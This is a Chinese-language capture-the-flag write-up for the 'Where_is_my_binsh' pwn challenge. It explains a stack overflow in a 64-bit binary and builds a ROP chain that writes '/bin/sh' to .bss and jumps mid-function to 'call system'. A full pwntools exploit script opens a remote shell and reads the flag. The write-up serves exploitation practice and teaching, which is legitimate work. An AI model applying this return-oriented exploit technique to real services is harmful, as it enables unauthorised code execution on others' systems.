# Where_is_my_binsh

## 题目简述

64 位 ELF 无 PIE、无 Canary，NX 开启。程序先把最多 0x10 字节用户输入写入固定的 `.bss` 地址 `0x404090`，随后又把最多 0x40 字节读入 0x10 字节栈缓冲区，形成栈溢出。

二进制中没有现成的 `/bin/sh` 字符串，但存在一个函数会先把 `rdi` 清零，再调用 `system()`。如果直接跳到该函数开头，参数会被覆盖；需要跳到函数内部的 `call system` 指令，并在此之前通过 ROP 设置 `rdi`。

## 解题过程

第一轮输入把命令字符串写到可预测的 `.bss`：

```text
binsh = 0x404090
```

第二轮栈缓冲区为 0x10 字节，加上 8 字节保存的 `rbp`，到返回地址的偏移为 `0x18`。可用 gadget 和调用点为：

```text
pop rdi ; ret = 0x401323
call system    = 0x401237
```

`0x401237` 位于 `whaaaaaaat()` 内部，正好跳过前面的 `mov edi, 0`，因此保留 ROP 链设置的参数。

连接参数由 `HOST`、`PORT` 环境变量提供：

```python
import os
from pwn import *

context.arch = "amd64"
HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])
io = remote(HOST, PORT)

binsh = 0x404090
pop_rdi_ret = 0x401323
call_system = 0x401237

io.sendafter(b"create it:", b"/bin/sh\x00")

payload = flat(
    b"A" * 0x18,
    pop_rdi_ret,
    binsh,
    call_system,
)
io.sendafter(b"want now ?", payload)
io.sendline(b"cat /flag")
io.interactive()
```

ROP 链最终执行 `system("/bin/sh")`，取得交互 shell 后读取 flag。题目归档只提供二进制，没有保存比赛实例中的 `/flag` 内容，因此不补写无法核验的固定字符串。

## 方法总结

- 核心技巧：先向固定 `.bss` 写入 `/bin/sh`，再用 `pop rdi; ret` 设置参数并跳入函数中部调用 `system()`。
- 识别信号：程序提供可控的全局写入位置、栈溢出和一个参数被错误初始化的半成品后门。
- 复用要点：ROP 不必从函数入口执行；检查函数中部是否存在可复用的 `call` 指令，但必须确认跳过的序言和参数初始化不会破坏后续执行。
